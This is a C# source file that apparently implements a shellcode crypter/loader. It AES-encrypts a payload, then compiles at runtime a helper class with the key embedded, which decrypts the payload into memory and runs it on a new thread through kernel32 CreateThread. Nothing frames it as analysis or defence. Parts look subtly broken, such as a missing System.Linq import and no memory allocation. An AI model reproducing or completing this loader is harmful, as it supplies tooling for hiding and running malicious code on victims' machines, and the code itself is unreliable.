using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Emit;

public static class Encryption
{
    public static byte[] EncryptData(byte[] data, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;
            aesAlg.Padding = PaddingMode.PKCS7;
            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
            return encryptor.TransformFinalBlock(data, 0, data.Length);
        }
    }

    public static byte[] CompileDecryptionCode(byte[] key, byte[] iv)
    {
        string code = GenerateDecryptionCode(key, iv);
        return CompileCode(code);
    }

    private static string GenerateDecryptionCode(byte[] key, byte[] iv)
    {
        string keyString = BitConverter.ToString(key).Replace("-", "");
        string ivString = BitConverter.ToString(iv).Replace("-", "");

        return $@"
            using System;
            using System.Runtime.InteropServices;
            using System.Security.Cryptography;
            using System.Text;

            public class DecryptionHelper
            {{
                public static void DecryptAndExecute(byte[] encryptedData, byte[] key, byte[] iv, IntPtr baseAddress)
                {{
                    byte[] keyBytes = Enumerable.Range(0, {key.Length})
                                           .Select(i => Convert.ToByte(""0x"" + ""{keyString}"".Substring(i * 2, 2), 16))
                                           .ToArray();
                    byte[] ivBytes = Enumerable.Range(0, {iv.Length})
                                          .Select(i => Convert.ToByte(""0x"" + ""{ivString}"".Substring(i * 2, 2), 16))
                                          .ToArray();

                    using (Aes aesAlg = Aes.Create())
                    {{
                        aesAlg.Key = keyBytes;
                        aesAlg.IV = ivBytes;
                        aesAlg.Padding = PaddingMode.PKCS7;
                        ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                        byte[] decryptedData = decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);

                        // Write the decrypted data to the allocated memory and execute
                        Marshal.Copy(decryptedData, 0, baseAddress, decryptedData.Length);

                        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out _);
                        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
                        CloseHandle(threadHandle);
                    }}
                }}

                [DllImport(""kernel32.dll"")]
                private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

                [DllImport(""kernel32.dll"")]
                private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

                [DllImport(""kernel32.dll"")]
                private static extern bool CloseHandle(IntPtr hObject);
            }}
        ";
    }

    private static byte[] CompileCode(string code)
    {
        SyntaxTree syntaxTree = CSharpSyntaxTree.ParseText(code);
        string assemblyName = Path.GetRandomFileName();
        var references = AppDomain.CurrentDomain.GetAssemblies().Where(a => !a.IsDynamic).Select(a => MetadataReference.CreateFromFile(a.Location)).ToArray();

        CSharpCompilation compilation = CSharpCompilation.Create(
            assemblyName,
            new[] { syntaxTree },
            references,
            new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary));

        using (var ms = new MemoryStream())
        {
            EmitResult result = compilation.Emit(ms);
            if (!result.Success)
            {
                var failures = result.Diagnostics.Where(diagnostic =>
                    diagnostic.IsWarningAsError || diagnostic.Severity == DiagnosticSeverity.Error);

                foreach (var diagnostic in failures)
                {
                    Console.Error.WriteLine("{0}: {1}", diagnostic.Id, diagnostic.GetMessage());
                }
                return null;
            }
            else
            {
                ms.Seek(0, SeekOrigin.Begin);
                return ms.ToArray();
            }
        }
    }
}
